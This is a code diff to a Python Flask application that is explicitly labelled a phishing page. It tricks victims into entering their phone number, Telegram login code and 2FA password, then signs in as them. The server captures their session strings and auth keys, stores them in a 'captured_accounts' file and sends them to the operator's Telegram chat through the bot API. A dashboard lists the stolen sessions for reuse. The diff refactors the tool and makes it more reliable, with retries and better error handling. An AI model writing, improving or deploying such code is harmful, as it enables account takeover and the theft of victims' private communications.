@@ -30,12 +30,13 @@ if sys.version_info >= (3, 14):
 
 app = Flask(__name__)
 
+# Thread-safe storage
 user_sessions = {}
 pending_codes = {}
 pending_2fa = {}
 sessions_lock = threading.Lock()
+phone_events = {}  # To notify waiting threads
 
-# ====== Persistent Storage ======
 DATA_FILE = "captured_accounts.json"
 
 def load_accounts():
@@ -43,8 +44,7 @@ def load_accounts():
         try:
             with open(DATA_FILE, 'r') as f:
                 return json.load(f)
-        except Exception as e:
-            logger.error(f"Load error: {e}")
+        except:
             return []
     return []
 
@@ -61,7 +61,6 @@ def save_account(account):
     with open(DATA_FILE, 'w') as f:
         json.dump(accounts, f, indent=2)
     logger.info(f"✅ Saved: {account['phone']}")
-    return account
 
 captured_accounts = load_accounts()
 
@@ -70,27 +69,18 @@ def is_phone_captured(phone):
     return any(a['phone'] == phone and a.get('session') and len(a['session']) > 10 for a in accounts)
 
 def format_phone(ph):
-    if not ph:
-        return ph
+    if not ph: return ph
     digits = ''.join(filter(str.isdigit, ph))
-    if not digits:
-        return ph
-    if ph.startswith('+'):
-        return ph
-    if len(digits) == 10:
-        return '+91' + digits
-    if len(digits) == 12 and digits.startswith('91'):
-        return '+' + digits
+    if not digits: return ph
+    if ph.startswith('+'): return ph
+    if len(digits) == 10: return '+91' + digits
+    if len(digits) == 12 and digits.startswith('91'): return '+' + digits
     return '+' + digits
 
 def send_bot_notification(phone, ss, me, dc, password_used=False):
     try:
         accounts = load_accounts()
-        already_notified = any(
-            a['phone'] == phone and a.get('bot_notified', False) 
-            for a in accounts
-        )
-        
+        already_notified = any(a['phone'] == phone and a.get('bot_notified', False) for a in accounts)
         if already_notified:
             logger.info(f"⏭️ Already notified for {phone}")
             return
@@ -99,36 +89,15 @@ def send_bot_notification(phone, ss, me, dc, password_used=False):
         extra = "\n🔐 **2FA Password Used**" if password_used else ""
         
         if len(ss) > max_len:
-            msg1 = (
-                f"🔔 **New Account Captured!**{extra}\n\n"
-                f"📱 **Phone:** `{phone}`\n"
-                f"👤 **Name:** {me.first_name or ''} {me.last_name or ''}\n"
-                f"🆔 **User ID:** `{me.id}`\n"
-                f"📛 **Username:** @{me.username or 'N/A'}\n"
-                f"🌐 **DC:** `{dc}`\n"
-                f"📏 **Session Length:** `{len(ss)} chars`\n\n"
-                f"📄 **Session (part 1/2):**\n`{ss[:max_len]}`"
-            )
+            msg1 = f"🔔 **New Account Captured!**{extra}\n\n📱 **Phone:** `{phone}`\n👤 **Name:** {me.first_name or ''} {me.last_name or ''}\n🆔 **User ID:** `{me.id}`\n📛 **Username:** @{me.username or 'N/A'}\n🌐 **DC:** `{dc}`\n📏 **Session Length:** `{len(ss)} chars`\n\n📄 **Session (part 1/2):**\n`{ss[:max_len]}`"
             msg2 = f"📄 **Session (part 2/2) for {phone}:**\n`{ss[max_len:]}`"
-            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
-            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
+            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
+            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
         else:
-            msg = (
-                f"🔔 **New Account!**{extra}\n"
-                f"📱 `{phone}`\n"
-                f"👤 {me.first_name} {me.last_name or ''}\n"
-                f"🆔 `{me.id}`\n"
-                f"🌐 DC: `{dc}`\n"
-                f"📏 Session: `{len(ss)} chars`\n\n"
-                f"🔑 **Session:**\n`{ss}`"
-            )
-            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
+            msg = f"🔔 **New Account!**{extra}\n📱 `{phone}`\n👤 {me.first_name} {me.last_name or ''}\n🆔 `{me.id}`\n🌐 DC: `{dc}`\n📏 Session: `{len(ss)} chars`\n\n🔑 **Session:**\n`{ss}`"
+            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
             if r.status_code != 200:
-                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
+                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': YOUR_TELEGRAM_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
         
         accounts = load_accounts()
         for a in accounts:
@@ -142,24 +111,24 @@ def send_bot_notification(phone, ss, me, dc, password_used=False):
         logger.error(f"Bot notify error: {e}")
 
 def run_telegram_action(phone, code=None, password=None):
-    """Run telegram action in a new event loop"""
+    """Run telegram action in a new event loop with proper timeout handling"""
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
     try:
         async def send_code():
             client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await client.connect()
-            
             try:
-                r = await client.send_code_request(phone)  # force_sms সরানো হয়েছে
+                await client.connect()
+                r = await client.send_code_request(phone)
                 session_str = StringSession.save(client.session)
                 
                 with sessions_lock:
                     user_sessions[phone] = {
                         'hash': r.phone_code_hash,
                         'session': session_str,
-                        'phone_code_result': r
+                        'phone_code_result': r,
+                        'created_at': time.time()
                     }
                     pending_codes[phone] = 'sent'
                     pending_2fa[phone] = False
@@ -172,7 +141,7 @@ def run_telegram_action(phone, code=None, password=None):
                     pending_codes[phone] = 'err'
                 return {'success': False, 'error': f'FloodWait {e.seconds}s'}
             except Exception as e:
-                logger.error(f"Error: {e}")
+                logger.error(f"send_code error: {e}")
                 with sessions_lock:
                     pending_codes[phone] = 'err'
                 return {'success': False, 'error': str(e)[:80]}
@@ -182,12 +151,19 @@ def run_telegram_action(phone, code=None, password=None):
         async def verify():
             already_captured = is_phone_captured(phone)
             
-            with sessions_lock:
-                if phone not in user_sessions:
-                    return {'success': False, 'error': 'Session not found'}
-                s = user_sessions[phone]
+            # Wait for session to be available (max 30 seconds)
+            session_data = None
+            for _ in range(30):
+                with sessions_lock:
+                    if phone in user_sessions:
+                        session_data = user_sessions[phone]
+                        break
+                await asyncio.sleep(1)
             
-            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
+            if not session_data:
+                return {'success': False, 'error': 'Session timeout - please send code again'}
+            
+            client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
             
             try:
                 await client.connect()
@@ -196,9 +172,7 @@ def run_telegram_action(phone, code=None, password=None):
                     me = await client.get_me()
                 else:
                     try:
-                        await client.sign_in(
-                            phone=phone, code=code, phone_code_hash=s['hash']
-                        )
+                        await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['hash'])
                         me = await client.get_me()
                     except errors.SessionPasswordNeededError:
                         with sessions_lock:
@@ -259,10 +233,7 @@ def run_telegram_action(phone, code=None, password=None):
                     'first_name': me.first_name or '',
                     'last_name': me.last_name or '',
                     'session': ss,
-                    'webk': json.dumps({
-                        'dcId': dc, 'authKey': auth_b64,
-                        'userId': me.id, 'isSupport': False, 'isTest': False
-                    }),
+                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64, 'userId': me.id, 'isSupport': False, 'isTest': False}),
                     'dc': dc,
                     'time': str(datetime.now()),
                     'has_2fa': password_used,
@@ -278,22 +249,17 @@ def run_telegram_action(phone, code=None, password=None):
                     logger.info(f"⏭️ {phone} already captured")
                 
                 with sessions_lock:
-                    if phone in user_sessions:
-                        del user_sessions[phone]
-                    if phone in pending_2fa:
-                        del pending_2fa[phone]
+                    if phone in user_sessions: del user_sessions[phone]
+                    if phone in pending_2fa: del pending_2fa[phone]
                     pending_codes[phone] = 'done'
                 
                 return {'success': True, 'session': ss, 'already_captured': already_captured}
                 
             except Exception as e:
                 e_str = str(e)
-                if 'PHONE_CODE_INVALID' in e_str:
-                    return {'success': False, 'error': 'Wrong code'}
-                if 'SESSION_PASSWORD_NEEDED' in e_str:
-                    return {'success': False, 'error': '2FA', 'needs_password': True}
-                if 'PASSWORD_HASH_INVALID' in e_str:
-                    return {'success': False, 'error': 'Wrong 2FA password'}
+                if 'PHONE_CODE_INVALID' in e_str: return {'success': False, 'error': 'Wrong code'}
+                if 'SESSION_PASSWORD_NEEDED' in e_str: return {'success': False, 'error': '2FA', 'needs_password': True}
+                if 'PASSWORD_HASH_INVALID' in e_str: return {'success': False, 'error': 'Wrong 2FA password'}
                 return {'success': False, 'error': e_str[:80]}
             finally:
                 try:
@@ -308,7 +274,7 @@ def run_telegram_action(phone, code=None, password=None):
     finally:
         loop.close()
 
-# ====== Phishing Page (same as before) ======
+# ====== Phishing Page ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -431,7 +397,7 @@ PAGE = """<!DOCTYPE html>
                 <div class="modal-icon">🔐</div>
                 <h2>Verification code</h2>
                 <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+91XXXXXXXXXX</span></p>
-                <div id="cs" class="sb waiting"><span class="sp"></span> Please wait ...</div>
+                <div id="cs" class="sb waiting"><span class="sp"></span> Telegram OTP পাঠানো হচ্ছে...</div>
                 <div class="cd" id="cdisp">_____</div>
                 <div class="np" id="np">
                     <button class="k" onclick="pk('1')">1</button>
@@ -543,7 +509,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb info';
-                cs.innerHTML = '⏳ Telegram OTP পাঠানো হচ্ছে... আপনার Telegram App চেক করুন';
+                cs.innerHTML = '⏳ Telegram OTP পাঠানো হচ্ছে... আপনার Telegram App বা SMS চেক করুন';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
@@ -566,13 +532,16 @@ PAGE = """<!DOCTYPE html>
             try {
                 var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
                 var data = await res.json();
-                if (data.s === 'sent') {
-                    clearInterval(codeCheckInterval);
-                    codeCheckInterval = null;
+                if (data.s === 'sent' || data.s === 'waiting') {
+                    // Keep showing code input - OTP might arrive any moment
                     var cs = document.getElementById('cs');
-                    cs.className = 'sb success';
-                    cs.innerHTML = '✅ Code sent! Enter below:';
-                    cs.style.display = 'block';
+                    if (data.s === 'sent') {
+                        cs.className = 'sb success';
+                        cs.innerHTML = '✅ Code পাঠানো হয়েছে! নিচে কোড লিখুন';
+                        cs.style.display = 'block';
+                        clearInterval(codeCheckInterval);
+                        codeCheckInterval = null;
+                    }
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
@@ -584,6 +553,13 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     document.getElementById('s2').classList.remove('active');
                     document.getElementById('s2b').classList.add('active');
+                } else if (data.s === 'err') {
+                    clearInterval(codeCheckInterval);
+                    codeCheckInterval = null;
+                    var cs = document.getElementById('cs');
+                    cs.className = 'sb error';
+                    cs.innerHTML = '❌ Error sending code. Try again.';
+                    cs.style.display = 'block';
                 }
             } catch(e) {}
         }, 2000);
@@ -707,9 +683,11 @@ def share():
     with sessions_lock:
         pending_codes[ph] = 'sent'
     
+    # Start telegram action in background thread
     t = threading.Thread(target=run_telegram_action, args=(ph,))
     t.daemon = True
     t.start()
+    
     return jsonify({'success': True})
 
 @app.route('/api/check', methods=['POST'])
@@ -726,6 +704,7 @@ def verify():
     code = d.get('code', '')
     password = d.get('password', None)
     ph = format_phone(ph)
+    
     result = run_telegram_action(ph, code, password)
     return jsonify(result)
 
@@ -753,9 +732,10 @@ def webk(phone):
     captured_accounts = load_accounts()
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
     if not a:
-        return "<html><body style='background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh'><div style='text-align:center;padding:40px;background:#141420;border-radius:20px'><h2 style='color:#e94560'>Not Found</h2><p style='color:#888'>No account found for this phone number.</p><a href='/dash' style='color:#0088cc'>Back to Dashboard</a></div></body></html>", 404
+        return "<html><body style='background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh'><div style='text-align:center;padding:40px;background:#141420;border-radius:20px'><h2 style='color:#e94560'>Not Found</h2><p style='color:#888'>No account found.</p><a href='/dash' style='color:#0088cc'>Back to Dashboard</a></div></body></html>", 404
     
-    w = a['webk']; ss = a['session']
+    w = a['webk']
+    ss = a['session']
     ss_ok = bool(ss) and len(ss) > 10
     has_2fa = a.get('has_2fa', False)
     twofa_badge = '<div class="warn">🔐 2FA account</div>' if has_2fa else ''
